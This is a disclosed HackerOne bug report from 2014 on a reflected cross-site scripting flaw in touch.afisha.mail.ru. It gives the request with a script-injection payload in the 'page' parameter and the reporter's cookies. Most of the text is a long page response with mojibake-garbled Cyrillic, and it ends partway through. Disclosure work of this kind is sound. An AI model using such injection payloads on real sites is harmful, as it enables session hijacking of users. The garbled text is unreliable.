---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13319'
original_report_id: '13319'
title: 'touch.afisha.mail.ru: XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-05-25T17:33:52.803Z'
disclosed_at: '2015-09-13T12:01:27.731Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# touch.afisha.mail.ru: XSS

## Metadata

- HackerOne Report ID: 13319
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:01:27.731Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Там весь хост дыряв.
Отстреливает тут:  
<div class="portal-footer__block">
			<a href="/go-afisha/?page=dab52"><script>alert(1)</script>ff243" class="portal-footer__link">ÐÐ¾Ð»Ð½Ð°Ñ Ð²ÐµÑÑÐ¸Ñ</a>&nbsp;|
			<a href="http://m.mail.ru/" class="portal-footer__link">ÐÐ»Ð°Ð²Ð½Ð°Ñ</a>&nbsp;|
			<a href="http://m.mail.ru/cgi-bin/splash?all=1" class="portal-footer__link">ÐÑÐµ Ð¿ÑÐ¾ÐµÐºÑÑ</a>
		</div>

GET /?page=dab52"><script>alert(1)</script>ff243 HTTP/1.1
Host: touch.afisha.mail.ru
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://touch.afisha.mail.ru/
Cookie: p=b0kAAEt9twAA; mref=http://my.mail.ru/video/top; mrcu=A6505381CD6669AD68F68DC71B5F; searchuid=1527834891401015703; HTML5Uploader=2; gmt=4; posts_subscriptions=isox@inbox.ru; VID=0Mm8Po3iv9HE:; _ga=GA1.2.49844597.1401016323; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAQCuwcA; current-page=month; mr1ladid=1_1000000_1000164_0; sdc=ZkNtEiOYcuxI9KMD; Mpop=1401016718:767444037873097519050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; _ym_visorc_9569476=w; mc1=1401016982; i=AQCizYFTBQATAAgKA0IBAdwEAfQEAagACAcCBQABvgABqgAIBwIFAAG+AAHvAQgEAQEAASoCBQIBAA==; b=Vj8JAGCX/QcA9AfbUHZdCQE8jlAdYgnz85UQ+x4Iwe2VsR9wCfeQkOCHDRzBBwAAhL8gqgj/dlUR; c=69GBUwEAAJoEAAAkAAAACQAg; s=s_vp=(2560/1279)|fver=13|dpr=1|geo=53





HTTP/1.1 200 OK
Server: nginx/1.2.8
Date: Sun, 25 May 2014 17:25:49 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Content-Length: 47444





<!DOCTYPE html>
<html lang="ru-RU">
<head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
 <meta name="description" content="ÐÑÐ¸ÑÐ° Mail.Ru"> 
 <meta name="viewport" content="width=device-width, user-scalable=no, maximum-scale=1.0, initial-scale=1.0, minimum-scale=1.0">
 <meta name="apple-mobile-web-app-status-bar-style" content="black">
 <title>ÐÑÐ¸ÑÐ°</title>
 <link rel="shortcut icon" href="http://afisha.mail.ru/favicon.ico">
 <link rel="stylesheet" href="/mobile/touch/style.css?01062014">
 <link rel="apple-touch-startup-image" href="/img/mobile/touch/apple-touch-icon.png" />
 <link rel="apple-touch-icon-precomposed" href="/img/mobile/touch/apple-touch-icon.png"/>
 <link rel="apple-touch-icon" href="/img/mobile/touch/apple-touch-icon.png">
 <link rel="apple-touch-icon" sizes="72x72" href="/img/mobile/touch/apple-touch-icon-ipad.png">
 <link rel="apple-touch-icon" sizes="114x114" href="/img/mobile/touch/apple-touch-icon-retina.png">
 <script type="text/javascript" src="http://img.imgsmail.ru/p/js/mrcookie.min.js"></script>
<script type="text/javascript" src="/js/tools/basic.js?1400835529"></script>
<script type="text/javascript">(function (window) {
	window.requestAnimationFrame = window.requestAnimationFrame ||
	window.webkitRequestAnimationFrame ||
	window.mozRequestAnimationFrame ||
	window.msRequestAnimationFrame ||
	window.oRequestAnimationFrame ||
	// oldIE Fallback
	function (fCallback) {
		window.setTimeout(fCallback, 1e3 / 60);
	};
}(this));
</script>
<script type="text/javascript" src="/js/tools/tools.Callbacks.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/tools.Deferred.js?1400835529"></script>
<script type="text/javascript" src="/js/cpf/tools/tools.pixelRatio.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/types.String.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/types.String.Url.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/dom/Nodes.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/dom/Handlers.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/dom/Requests.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/touch/fj.Tools.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/dom/Effects.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/Auth.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/fj.mainInit.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/touch/fj.showPopup.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/touch/fj.rbBanner.js?1400835529"></script>
</head> 
<body>
<div class="js-main_popup hidden popup_bggr">

<div class="js-popup_overlay popup__overlay">
	<div class="popup js-popup_close js-popup_cont">
				
	
	<div class="slct-region js-region_slct hidden">
		<b>ÐÑÐ±ÑÐ°ÑÑ ÑÐµÐ³Ð¸Ð¾Ð½</b>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐºÐ°ÑÐµÑÐ¸Ð½Ð±ÑÑÐ³</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ°Ð·Ð°Ð½Ñ</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ¾ÑÐºÐ²Ð°</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ¸Ð¶Ð½Ð¸Ð¹ ÐÐ¾Ð²Ð³Ð¾ÑÐ¾Ð´</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ¾Ð²Ð¾ÑÐ¸Ð±Ð¸ÑÑÐº</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">Ð¡Ð°Ð½ÐºÑ-ÐÐµÑÐµÑÐ±ÑÑÐ³</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">Ð§ÐµÐ»ÑÐ±Ð¸Ð½ÑÐº</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ¸ÐµÐ²</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ¸Ð½ÑÐº</a></div>
		
			<div><a href="http://m.mail.ru/cgi-bin/ajax_weather_city?mobile=1&act=change&page=http://touch.afisha.mail.ru">ÐÐ»Ð¼Ð°ÑÑ</a></div>
		
	</div>

</div></div>
</div>
<div class="js-gallery_popup hidden">

</div>
<div id="main">

<div class="counters">
	<img src="http://rs.mail.ru/d329801.gif?rnd=125914647&ts=1401038749" style="width:0;height:0;position:absolute;" alt=""/>
<img src="http://rs.mail.ru/d368066.gif?" width="1" height="1" border="0" alt="" style="position:absolute;" /><img src="http://www.tns-counter.ru/V13a****mail_ru/ru/CP1251/tmsec=mail_afisha-mobile/" width="1" height="1" alt="" style="position:absolute;"  />
<!-- Rating@Mail.ru counter -->
<script type="text/javascript">//<![CDATA[
var _tmr = _tmr || [];
_tmr.push({id: '2104775',  type: 'pageView', start: (new Date()).getTime()});
(function (d, w) {
 var ts = d.createElement('script'); ts.type = 'text/javascript'; ts.async = true;
 ts.src = (d.location.protocol == 'https:' ? 'https:' : 'http:') + '//top-fwz1.mail.ru/js/code.js';
 var f = function () {var s = d.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ts, s);};
 if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window);
//]]></script><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=2104775;js=na;r=http%3A%2F%2Ftouch.afisha.mail.ru%2F" style="border:0;" height="1" width="1" alt="Ð ÐµÐ¹ÑÐ¸Ð½Ð³@Mail.ru" />
</div></noscript>
<!-- //Rating@Mail.ru counter -->
<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<img src='http://counter.yadro.ru/hit;afisha-tv?r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' width='1' height='1' alt='' />")//--></script><!--/LiveInternet-->


<!-- Rating@Mail.ru counter -->
<script type="text/javascript">//<![CDATA[
var _tmr = _tmr || [];
_tmr.push({id: '87520',  type: 'pageView', start: (new Date()).getTime()});
(function (d, w) {
 var ts = d.createElement('script'); ts.type = 'text/javascript'; ts.async = true;
 ts.src = (d.location.protocol == 'https:' ? 'https:' : 'http:') + '//top-fwz1.mail.ru/js/code.js';
 var f = function () {var s = d.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ts, s);};
 if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window);
//]]></script><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=87520;js=na;r=http%3A%2F%2Ftouch.afisha.mail.ru%2F" style="border:0;" height="1" width="1" alt="Ð ÐµÐ¹ÑÐ¸Ð½Ð³@Mail.ru" />
</div></noscript>
<!-- //Rating@Mail.ru counter -->
<!-- Rating@Mail.ru counter -->
<script type="text/javascript">//<![CDATA[
var _tmr = _tmr || [];
_tmr.push({id: '2359529',  type: 'pageView', start: (new Date()).getTime()});
(function (d, w) {
 var ts = d.createElement('script'); ts.type = 'text/javascript'; ts.async = true;
 ts.src = (d.location.protocol == 'https:' ? 'https:' : 'http:') + '//top-fwz1.mail.ru/js/code.js';
 var f = function () {var s = d.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ts, s);};
 if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window);
//]]></script><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=2359529;js=na;r=http%3A%2F%2Ftouch.afisha.mail.ru%2F" style="border:0;" height="1" width="1" alt="Ð ÐµÐ¹ÑÐ¸Ð½Ð³@Mail.ru" />
</div></noscript>
<!-- //Rating@Mail.ru counter -->


</div>


	<!-- rb: 2719?_SITEZONE=2 -->
	
	<!-- / rb: 2719?_SITEZONE=2 -->
	<div class="js-headline">
		<!-- rb: 1903 (portal-headline) -->
		
		<!-- / rb: 1903 (portal-headline) -->
	</div>
	<div class="portal-menu">
		<div class="portal-menu__inner">
			<a class="portal-menu__logo" href="/">
				<img class="portal-menu__logo__img" src="/img/mobile/touch/portal-menu__logo.png" width="147" height="19" alt="">
			</a>
			<div class="portal-menu__buttons">
				<a href="#" class="portal-menu__buttons__item js-tggl_search">
					<span class="portal-menu__buttons__item__ico portal-menu__buttons__item__ico_search"></span>
				</a>
			</div>
		</div>
	</div>	
	
<div class="page">
	
	<div class="ad">
<img src="http://rs.mail.ru/a1331220.gif?rnd=199582459&ts=1401038749" style="width:0;height:0;position:absolute;" alt=""/>

</div>
	
	<div class="js-block-search block shd_bgwh slide_animated hidden">
		<div class="pd">
			<form id="search-form" action="/search/">
			<input type="hidden" value="70" name="region_id"/>
			<table class="srch">
			
			<tr>
				<td><input type="text" class="inp" name="q" value="ÐÐ¾Ð¸ÑÐº Ð¿Ð¾ ÑÐ°Ð¹ÑÑ" onfocus="if(value=='ÐÐ¾Ð¸ÑÐº Ð¿Ð¾ ÑÐ°Ð¹ÑÑ') value=''"></td>
				<th><i class="bg-sbm"><input type="submit" class="sbm sbm-f" value="ÐÐ°Ð¹ÑÐ¸"></i></th>
			</tr>
			</table>
			</form>
		</div>
	</div>
	
	
		<div class="block_bggr">
			<div class="prj-menu clearin">
				<ul class="menu js-menu">
				
					<li class="li-menu-1"><a href="/" class="menu-on"><i class="menuicon-movies"></i>ÐÐ¸Ð½Ð¾</a></li>
					
				
					<li class="li-menu-2"><a href="/msk/series/"><i class="menuicon-series"></i>Ð¡ÐµÑÐ¸Ð°Ð»Ñ</a></li>
					
				
					<li class="li-menu-3"><a href="/msk/tvshow/"><i class="menuicon-tvshow"></i>Ð¢ÐµÐ»ÐµÑÐ¾Ñ</a></li>
					
				
					<li class="li-menu-4"><a href="/msk/restaurant/"><i class="menuicon-resto"></i>Ð ÐµÑÑÐ¾ÑÐ°Ð½Ñ</a></li>
					
					<li class="li-menu-all js-menu_toggle"><a href="#"><i class="menuicon-all"></i></a></li>
					
				
					<li class="li-menu-5"><a href="/msk/concert/"><i class="menuicon-concert"></i>ÐÐ¾Ð½ÑÐµÑÑÑ</a></li>
					
				
					<li class="li-menu-6"><a href="/msk/club/"><i class="menuicon-club"></i>ÐÐ»ÑÐ±Ñ</a></li>
					
				
					<li class="li-menu-7"><a href="/msk/theatre/"><i class="menuicon-theatre"></i>Ð¢ÐµÐ°ÑÑÑ</a></li>
					
				
					<li class="li-menu-8"><a href="/msk/exhibition/"><i class="menuicon-exhibition"></i>ÐÑÑÑÐ°Ð²ÐºÐ¸</a></li>
					
				
					<li class="li-menu-9"><a href="/msk/children/"><i class="menuicon-children"></i>ÐÐµÑÑÐ¼</a></li>
					
				
				</ul>
			</div>
		</div>
	

	

	
		<!-- 5948 -->
		
		<!-- 5948 -->
	


	
	    
	
		<div class="block_gr_top">
		<div class="shd">
			<h2><a href="/msk/cinema/kinoafisha/"><i>Ð¡ÐµÐ¹ÑÐ°Ñ Ð² ÐºÐ¸Ð½Ð¾</i></a></h2>
		</div>
		</div>
	
		
	<div class="bg-g">
		<div class="js-scroll_gallery glr">
			<div class="wrapper js-wrapper"><div class="glr_item">
	<a href="/cinema/movies/720169_lyudi_iks_dni_minuvshego_buduschego/">
		<span class="glr_ttl"><b>ÐÑÐ´Ð¸ ÐÐºÑ: ÐÐ½Ð¸ Ð¼Ð¸Ð½ÑÐ²ÑÐµÐ³Ð¾ Ð±ÑÐ´ÑÑÐµÐ³Ð¾</b></span>
		<img src="http://pic.afisha.mail.ru/2939476/" alt="" width="240" height="136">
	</a>
</div><div class="glr_item">
	<a href="/cinema/movies/814835_podarok_s_harakterom/">
		<span class="glr_ttl"><b>ÐÐ¾Ð´Ð°ÑÐ¾Ðº Ñ ÑÐ°ÑÐ°ÐºÑÐµÑÐ¾Ð¼</b></span>
		<img src="http://pic.afisha.mail.ru/2410399/" alt="" width="240" height="136">
	</a>
</div><div class="glr_item">
	<a href="/cinema/movies/769904_printsessa_monako/">
		<span class="glr_ttl"><b>ÐÑÐ¸Ð½ÑÐµÑÑÐ° ÐÐ¾Ð½Ð°ÐºÐ¾</b></span>
		<img src="http://pic.afisha.mail.ru/2929580/" alt="" width="240" height="136">
	</a>
</div><div class="glr_item">
	<a href="/cinema/movies/808099_etim_utrom_v_nyu_iorke/">
		<span class="glr_ttl"><b>ÐÑÐ¸Ð¼ ÑÑÑÐ¾Ð¼ Ð² ÐÑÑ-ÐÐ¾ÑÐºÐµ</b></span>
		<img src="http://pic.afisha.mail.ru/2939530/" alt="" width="240" height="136">
	</a>
</div>			</div>
		</div>
	</div>
	<script type="text/javascript" src="/js/tools/touch/fj.moveElems.js?1400835529"></script>
<script type="text/javascript" src="/js/tools/touch/fj.touchMove.js?1400835529"></script>
<script type="text/javascript" src="/js/touch/tv/fj.touchScroll.js?1400835529"></script>
	<script>
		(function ($f) {
			$f('.js-scroll_gallery').touchScroll();
		})(window.$f);
	</script>



		<div id="slot_3333"></div>
	
		<div class="block js-cinema_now hidden">
			<div class="bg-g">
				<h2><a>Ð ÑÐ´Ð¾Ð¼</a></h2>
				<table class="btn">
				<tr>
					<td><a href="#" class="js-tab btn-on">ÐÐ¸Ð½Ð¾ÑÐµÐ°ÑÑÑ</a></td>
					<td><a href="#" class="js-tab">Ð¡ÐµÐ°Ð½ÑÑ</a></td>
				</tr>
				</table>
			</div>
			
			<div class="js-near_cinemas js-tab_cont">
				<div class="js-geo_cont js-pgng_cntr" onclick="return {
	failUrl: '/msk/cinema/places/?async=1&page=1&count=10',
	reqUrl: '/near_place/1/?count=10&page='
}"><div class="shd"><h4><a class="loader_2" href="#"></a></h4></div></div>

	
	<div class="js-tomore shd mb3 hidden">
		<h4><a href="?page=2" class="js-tomore_lnk">ÐµÑÑ</a></h4>
	</div>
	


				
			</div>
			<div class="js-near_cont js-tab_cont hidden">		
			<div class="js-geo_cont js-pgng_cntr" onclick="return {
	reqUrl: '/near_movie/?count=3&page='
}"><div class="shd"><h4><a class="loader" href="#"></a></h4></div></div>

	
	<div class="js-tomore shd mb3 hidden">
		<h4><a href="?page=2" class="js-tomore_lnk">ÐµÑÑ</a></h4>
	</div>
	


			</div>
		</div>
		
		
		<div class="block_gr">
			<div class="shd">
				<h2><a>ÐÐ°Ð¹ÑÐ¸ ÑÐµÐ°Ð½Ñ</a></h2>
			</div>
				

	

	
	<div class="block_gr pb0">
		<div class="txt"></div>
		<a name="s_form" id="s_form"></a>
		<form action="/msk/cinema/kinoafisha/#s_form">
			
	<input type="hidden" name="search" value="1">


				<table class="cldr">
				<tr>
					<td>
						

<div class="slct_name">ÐÐ¾Ð³Ð´Ð°</div>
<select name="date" class="slct w100 js-date">
	
		<option value="2014-05-25">Ð¡ÐµÐ³Ð¾Ð´Ð½Ñ</option>
	
		<option value="2014-05-26">ÐÐ°Ð²ÑÑÐ°</option>
	
		<option value="2014-05-27">ÐÑ, 27 Ð¼Ð°Ñ</option>
	
		<option value="2014-05-28">Ð¡Ñ, 28 Ð¼Ð°Ñ</option>
	
		<option value="2014-05-29">Ð§Ñ, 29 Ð¼Ð°Ñ</option>
	
		<option value="2014-05-30">ÐÑ, 30 Ð¼Ð°Ñ</option>
	
		<option value="2014-05-31">Ð¡Ð±, 31 Ð¼Ð°Ñ</option>
	
		<option value="2014-06-01">ÐÑ, 01 Ð¸ÑÐ½Ñ</option>
	
		<option value="2014-06-02">ÐÐ½, 02 Ð¸ÑÐ½Ñ</option>
	
		<option value="2014-06-03">ÐÑ, 03 Ð¸ÑÐ½Ñ</option>
	
</select>					

					</td>
				</tr>
				<tr>
					<td>
						

	<select name="part_of_day" class="slct w100">
		<option value="">ÐÐµÑÑ Ð´ÐµÐ½Ñ</option>
		
		<option value="m">Ð£ÑÑÐ¾</option>
		
		<option value="d">ÐÐµÐ½Ñ</option>
		
		<option value="e">ÐÐµÑÐµÑ Ð¸ Ð½Ð¾ÑÑ</option>
		
	</select>

					</td>
				</tr>
				<tr>
					<td>
						

<div class="slct_name">ÐÐ°Ð½Ñ</div>
<select name="jenre" class="slct w100">
	<option value="">ÐÑÐ±Ð¾Ð¹</option>
	
		<option value="5">Ð°Ð½Ð¸Ð¼Ð°ÑÐ¸Ñ</option>
	
		<option value="6">Ð°Ð½Ð¸Ð¼Ðµ</option>
	
		<option value="7">Ð±Ð¸Ð¾Ð³ÑÐ°ÑÐ¸Ñ</option>
	
		<option value="8">Ð±Ð¾ÐµÐ²Ð¸Ðº</option>
	
		<option value="9">Ð²ÐµÑÑÐµÑÐ½</option>
	
		<option value="10">Ð²Ð¾ÐµÐ½Ð½ÑÐ¹</option>
	
		<option value="11">Ð´ÐµÑÐµÐºÑÐ¸Ð²</option>
	
		<option value="12">Ð´ÐµÑÑÐºÐ¸Ð¹</option>
	
		<option value="13">Ð´Ð¾ÐºÑÐ¼ÐµÐ½ÑÐ°Ð»ÑÐ½ÑÐ¹</option>
	
		<option value="1">Ð´ÑÐ°Ð¼Ð°</option>
	
		<option value="14">Ð¸ÑÑÐ¾ÑÐ¸ÑÐµÑÐºÐ¸Ð¹</option>
	
		<option value="3">ÐºÐ¾Ð¼ÐµÐ´Ð¸Ñ</option>
	
		<option value="16">ÐºÐ¾ÑÐ¾ÑÐºÐ¾Ð¼ÐµÑÑÐ°Ð¶Ð½ÑÐ¹</option>
	
		<option value="15">ÐºÑÐ¸Ð¼Ð¸Ð½Ð°Ð»</option>
	
		<option value="2">Ð¼ÐµÐ»Ð¾Ð´ÑÐ°Ð¼Ð°</option>
	
		<option value="17">Ð¼ÑÐ·ÑÐºÐ°Ð»ÑÐ½ÑÐ¹</option>
	
		<option value="18">Ð¼ÑÐ»ÑÑÐ¸Ð¿Ð»Ð¸ÐºÐ°ÑÐ¸Ð¾Ð½Ð½ÑÐ¹</option>
	
		<option value="19">Ð¼ÑÐ·Ð¸ÐºÐ»</option>
	
		<option value="20">Ð¿ÑÐ¸ÐºÐ»ÑÑÐµÐ½Ð¸Ñ</option>
	
		<option value="21">ÑÐµÐ¼ÐµÐ¹Ð½ÑÐ¹</option>
	
		<option value="133">ÑÐ¿Ð¾ÑÑ</option>
	
		<option value="22">ÑÑÐ°Ð³Ð¸ÐºÐ¾Ð¼ÐµÐ´Ð¸Ñ</option>
	
		<option value="4">ÑÑÐ¸Ð»Ð»ÐµÑ</option>
	
		<option value="23">ÑÐ¶Ð°ÑÑ</option>
	
		<option value="24">ÑÐ°Ð½ÑÐ°ÑÑÐ¸ÐºÐ°</option>
	
		<option value="25">ÑÑÐ½ÑÐµÐ·Ð¸</option>
	
</select>

					</td>
				</tr>
				
				<tr>
					<td>
						

<div class="slct_name">ÐÐµÑÑÐ¾</div>
<select name="subway" class="slct w100">
	<option value="">ÐÑÐ±Ð°Ñ ÑÑÐ°Ð½ÑÐ¸Ñ</option>
	
	<option value="1">ÐÐ²Ð¸Ð°Ð¼Ð¾ÑÐ¾ÑÐ½Ð°Ñ</option>
	
	<option value="2">ÐÐ²ÑÐ¾Ð·Ð°Ð²Ð¾Ð´ÑÐºÐ°Ñ</option>
	
	<option value="3">ÐÐºÐ°Ð´ÐµÐ¼Ð¸ÑÐµÑÐºÐ°Ñ</option>
	
	<option value="4">ÐÐ»ÐµÐºÑÐ°Ð½Ð´ÑÐ¾Ð²ÑÐºÐ¸Ð¹ ÑÐ°Ð´</option>
	
	<option value="5">ÐÐ»ÐµÐºÑÐµÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="23">ÐÐ»Ð¼Ð°-ÐÑÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="6">ÐÐ»ÑÑÑÑÐµÐ²Ð¾</option>
	
	<option value="7">ÐÐ½Ð½Ð¸Ð½Ð¾</option>
	
	<option value="8">ÐÑÐ±Ð°ÑÑÐºÐ°Ñ</option>
	
	<option value="271">ÐÑÐ±Ð°ÑÑÐºÐ°Ñ</option>
	
	<option value="9">ÐÑÑÐ¾Ð¿Ð¾ÑÑ</option>
	
	<option value="10">ÐÐ°Ð±ÑÑÐºÐ¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="11">ÐÐ°Ð³ÑÐ°ÑÐ¸Ð¾Ð½Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="12">ÐÐ°ÑÑÐ¸ÐºÐ°Ð´Ð½Ð°Ñ</option>
	
	<option value="13">ÐÐ°ÑÐ¼Ð°Ð½ÑÐºÐ°Ñ</option>
	
	<option value="14">ÐÐµÐ³Ð¾Ð²Ð°Ñ</option>
	
	<option value="272">ÐÐµÐ»Ð¾ÑÑÑÑÐºÐ°Ñ</option>
	
	<option value="15">ÐÐµÐ»Ð¾ÑÑÑÑÐºÐ°Ñ</option>
	
	<option value="16">ÐÐµÐ»ÑÐµÐ²Ð¾</option>
	
	<option value="17">ÐÐ¸Ð±Ð¸ÑÐµÐ²Ð¾</option>
	
	<option value="18">ÐÐ¸Ð±Ð»Ð¸Ð¾ÑÐµÐºÐ° Ð¸Ð¼. ÐÐµÐ½Ð¸Ð½Ð°</option>
	
	<option value="394">ÐÐ¸ÑÑÐµÐ²ÑÐºÐ¸Ð¹ Ð¿Ð°ÑÐº</option>
	
	<option value="273">ÐÐ¾ÑÐ¸ÑÐ¾Ð²Ð¾</option>
	
	<option value="20">ÐÐ¾ÑÐ¾Ð²Ð¸ÑÐºÐ°Ñ</option>
	
	<option value="21">ÐÐ¾ÑÐ¾Ð²ÑÐºÐ¾Ðµ ÑÐ¾ÑÑÐµ</option>
	
	<option value="22">ÐÐ¾ÑÐ°Ð½Ð¸ÑÐµÑÐºÐ¸Ð¹ ÑÐ°Ð´</option>
	
	<option value="24">ÐÑÐ°ÑÐ¸ÑÐ»Ð°Ð²ÑÐºÐ°Ñ</option>
	
	<option value="25">ÐÑÐ»ÑÐ²Ð°Ñ Ð°Ð´Ð¼Ð¸ÑÐ°Ð»Ð° Ð£ÑÐ°ÐºÐ¾Ð²Ð°</option>
	
	<option value="26">ÐÑÐ»ÑÐ²Ð°Ñ ÐÐ¼Ð¸ÑÑÐ¸Ñ ÐÐ¾Ð½ÑÐºÐ¾Ð³Ð¾</option>
	
	<option value="27">ÐÑÐ½Ð¸Ð½ÑÐºÐ°Ñ Ð°Ð»Ð»ÐµÑ</option>
	
	<option value="28">ÐÐ°ÑÑÐ°Ð²ÑÐºÐ°Ñ</option>
	
	<option value="29">ÐÐÐÐ¥</option>
	
	<option value="30">ÐÐ»Ð°Ð´ÑÐºÐ¸Ð½Ð¾</option>
	
	<option value="31">ÐÐ¾Ð´Ð½ÑÐ¹ ÑÑÐ°Ð´Ð¸Ð¾Ð½</option>
	
	<option value="32">ÐÐ¾Ð¹ÐºÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="33">ÐÐ¾Ð»Ð³Ð¾Ð³ÑÐ°Ð´ÑÐºÐ¸Ð¹ Ð¿ÑÐ¾ÑÐ¿ÐµÐºÑ</option>
	
	<option value="34">ÐÐ¾Ð»Ð¶ÑÐºÐ°Ñ</option>
	
	<option value="35">ÐÐ¾Ð»Ð¾ÐºÐ¾Ð»Ð°Ð¼ÑÐºÐ°Ñ</option>
	
	<option value="36">ÐÐ¾ÑÐ¾Ð±ÑÐµÐ²Ñ Ð³Ð¾ÑÑ</option>
	
	<option value="37">ÐÐ¾ÑÑÑÑÐºÐ¾Ð²Ð¾</option>
	
	<option value="39">ÐÑÑÑÐ°Ð²Ð¾ÑÐ½Ð°Ñ</option>
	
	<option value="38">ÐÑÑÐ¸Ð½Ð¾</option>
	
	<option value="40">ÐÐ¸Ð½Ð°Ð¼Ð¾</option>
	
	<option value="41">ÐÐ¼Ð¸ÑÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="42">ÐÐ¾Ð±ÑÑÐ½Ð¸Ð½ÑÐºÐ°Ñ</option>
	
	<option value="43">ÐÐ¾Ð¼Ð¾Ð´ÐµÐ´Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="44">ÐÐ¾ÑÑÐ¾ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="45">ÐÑÐ±ÑÐ¾Ð²ÐºÐ°</option>
	
	<option value="395">ÐÑÐ»ÐµÐ±Ð¸Ð½Ð¾</option>
	
	<option value="46">ÐÑÐ±Ð»Ð¸ÐºÐ¾Ð²Ð¾</option>
	
	<option value="47">ÐÐ·Ð¼Ð°Ð¹Ð»Ð¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="48">ÐÐ°Ð»ÑÐ¶ÑÐºÐ°Ñ</option>
	
	<option value="49">ÐÐ°Ð½ÑÐµÐ¼Ð¸ÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="50">ÐÐ°ÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="274">ÐÐ°ÑÐ¸ÑÑÐºÐ°Ñ</option>
	
	<option value="51">ÐÐ°ÑÐ¸ÑÑÐºÐ°Ñ</option>
	
	<option value="275">ÐÐ¸ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="276">ÐÐ¸ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="52">ÐÐ¸ÐµÐ²ÑÐºÐ°Ñ</option>
	
	<option value="277">ÐÐ¸ÑÐ°Ð¹-Ð³Ð¾ÑÐ¾Ð´</option>
	
	<option value="53">ÐÐ¸ÑÐ°Ð¹-Ð³Ð¾ÑÐ¾Ð´</option>
	
	<option value="54">ÐÐ¾Ð¶ÑÑÐ¾Ð²ÑÐºÐ°Ñ</option>
	
	<option value="55">ÐÐ¾Ð»Ð¾Ð¼ÐµÐ½ÑÐºÐ°Ñ</option>
	
	<option value="56">ÐÐ¾Ð¼ÑÐ¾Ð¼Ð¾Ð»ÑÑÐºÐ°Ñ</option>
	
	<option value="278">ÐÐ¾Ð¼ÑÐ¾Ð¼Ð¾Ð»ÑÑÐºÐ°Ñ</option>
	
	<option value="57">ÐÐ¾Ð½ÑÐºÐ¾Ð²Ð¾</option>
	
